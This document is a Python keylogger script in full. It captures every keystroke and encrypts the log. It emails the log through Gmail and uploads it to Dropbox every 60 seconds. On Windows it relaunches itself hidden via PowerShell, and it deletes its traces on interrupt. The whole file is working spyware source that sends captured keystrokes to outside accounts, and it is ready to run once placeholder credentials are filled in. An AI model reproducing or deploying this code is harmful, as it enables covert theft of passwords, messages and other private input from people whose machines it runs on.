import pynput
from pynput.keyboard import Listener
import logging
import smtplib
from email.message import EmailMessage
import threading
from cryptography.fernet import Fernet
import os
import dropbox
import sys
import subprocess

# Configure logging to save keystrokes to a file
LOG_FILE = "keylog.txt"
ENCRYPTED_FILE = "keylog.enc"
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Email Configuration
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"  # Replace with your email password
SEND_TO = "recipient_email@gmail.com"  # Replace with the recipient email
EMAIL_INTERVAL = 60  # Send logs every 60 seconds

# Dropbox Configuration
DROPBOX_ACCESS_TOKEN = "your_dropbox_access_token"  # Replace with your Dropbox token
DROPBOX_PATH = "/keylog.enc"

# Hide script from process list (Windows Only)
def hide_process():
    if os.name == "nt":  # Windows
        try:
            subprocess.call("powershell -Command \"Start-Process pythonw.exe -ArgumentList '{}' -WindowStyle Hidden\"".format(sys.argv[0]), shell=True)
            sys.exit()
        except Exception as e:
            print(f"[-] Error hiding process: {e}")

# Run hide_process only on Windows
if os.name == "nt":
    hide_process()

def upload_to_dropbox():
    """Upload encrypted log file to Dropbox"""
    encrypt_logs()
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
    with open(ENCRYPTED_FILE, "rb") as f:
        dbx.files_upload(f.read(), DROPBOX_PATH, mode=dropbox.files.WriteMode("overwrite"))
    print("[+] Logs uploaded to Dropbox")

# Generate or load encryption key
KEY_FILE = "key.key"
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)

def load_key():
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

try:
    KEY = load_key()
except FileNotFoundError:
    generate_key()
    KEY = load_key()

encryptor = Fernet(KEY)

def encrypt_logs():
    """Encrypt log file before sending"""
    with open(LOG_FILE, "rb") as f:
        log_data = f.read()
    encrypted_data = encryptor.encrypt(log_data)
    with open(ENCRYPTED_FILE, "wb") as ef:
        ef.write(encrypted_data)

def send_email():
    """Send encrypted keystrokes via email"""
    encrypt_logs()
    with open(ENCRYPTED_FILE, "rb") as f:
        encrypted_data = f.read()
    if encrypted_data:
        msg = EmailMessage()
        msg.set_content("Encrypted keylogger report attached.")
        msg["Subject"] = "Keylogger Report (Encrypted)"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = SEND_TO
        msg.add_attachment(encrypted_data, maintype='application', subtype='octet-stream', filename="keylog.enc")
        
        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.send_message(msg)
            print("[+] Email sent successfully!")
        except Exception as e:
            print(f"[-] Error sending email: {e}")

    # Clear log file after sending
    open(LOG_FILE, "w").close()
    open(ENCRYPTED_FILE, "w").close()
    
    # Schedule next email and Dropbox upload
    threading.Timer(EMAIL_INTERVAL, send_email).start()
    threading.Timer(EMAIL_INTERVAL, upload_to_dropbox).start()

def self_destruct():
    """Delete all traces of the keylogger after execution"""
    try:
        os.remove(LOG_FILE)
        os.remove(ENCRYPTED_FILE)
        os.remove(KEY_FILE)
        print("[+] Self-destruct sequence activated. Files removed.")
    except Exception as e:
        print(f"[-] Error in self-destruct: {e}")

def on_press(key):
    """Callback function to log key presses"""
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Start sending logs via email and uploading to Dropbox periodically
send_email()
upload_to_dropbox()

# Start listening to keyboard events
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    self_destruct()
